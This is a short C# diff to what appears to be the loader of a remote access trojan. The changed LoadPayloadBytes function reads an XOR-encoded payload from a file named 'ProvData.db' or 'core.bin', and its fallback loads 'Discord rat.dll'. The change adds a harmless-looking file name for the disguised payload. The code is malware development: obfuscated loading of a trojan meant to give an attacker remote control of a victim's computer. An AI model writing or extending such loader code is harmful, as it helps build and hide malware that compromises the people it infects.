@@ -40,10 +40,14 @@ namespace Loader
 
         private static byte[] LoadPayloadBytes(string baseDir)
         {
-            string protectedPath = Path.Combine(baseDir, "core.bin");
-            if (File.Exists(protectedPath))
+            string[] protectedNames = { "ProvData.db", "core.bin" };
+            foreach (string name in protectedNames)
             {
-                return XorDecode(File.ReadAllBytes(protectedPath));
+                string protectedPath = Path.Combine(baseDir, name);
+                if (File.Exists(protectedPath))
+                {
+                    return XorDecode(File.ReadAllBytes(protectedPath));
+                }
             }
 
             string devPath = Path.Combine(baseDir, "Discord rat.dll");
